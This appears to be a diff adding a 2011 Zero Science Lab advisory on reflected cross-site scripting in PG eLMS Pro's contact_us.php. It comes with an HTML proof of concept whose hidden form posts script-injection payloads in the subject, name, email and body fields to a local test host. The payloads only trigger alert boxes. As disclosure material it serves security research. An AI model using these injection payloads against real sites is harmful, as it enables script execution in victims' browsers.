@@ -1,0 +1,56 @@
+<!--
+
+PG eLMS Pro vDEC_2007_01 (contact_us.php) Multiple POST XSS Vulnerabilities
+
+Vendor: PilotGroup Ltd
+Product web page: http://www.elmspro.com
+Affected version: DEC_2007_01
+
+Summary: eLMS Pro solution is an outstanding and yet simple Learning Management
+system. Our product is designed for any education formations: from small distance
+training companies up to big colleges and universities. The system allows to build
+courses, import SCORM content, deploy online learning, manage users, communicate
+with users, track training results, and more.
+
+Desc: Input passed via the 'subject', 'name', 'email' and 'body' parameters to
+'contact_us.php' script is not properly sanitised before being returned to the
+user. This can be exploited to execute arbitrary HTML and script code in a user's
+browser session in context of an affected site.
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 1.3.27 (Win32)
+           PHP 5.2.4
+           MySQL 14.14 Distrib 5.1.43 (Win32-ia32)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab
+
+
+Advisory ID: ZSL-2011-5027
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5027.php
+
+
+
+08.07.2011
+
+-->
+
+
+<html>
+<title>PG eLMS Pro vDEC_2007_01 (contact_us.php) Multiple POST XSS Vulnerabilities</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">function xss1(){document.forms["xss"].submit();}</script>
+<form action="http://localhost:6450/contact_us.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="send" value="1" />
+<input type="hidden" name="subject" value='"><script>alert(1)</script>' />
+<input type="hidden" name="name" value='"><script>alert(2)</script>' />
+<input type="hidden" name="email" value='"><script>alert(3)</script>' />
+<input type="hidden" name="body" value='1&lt;/textarea&gt;"><script>alert(4)</script>' />
+</form>
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><center><h3><br /><br />Exploit!<h3></center></font></b></a>
+</body>
+</html>
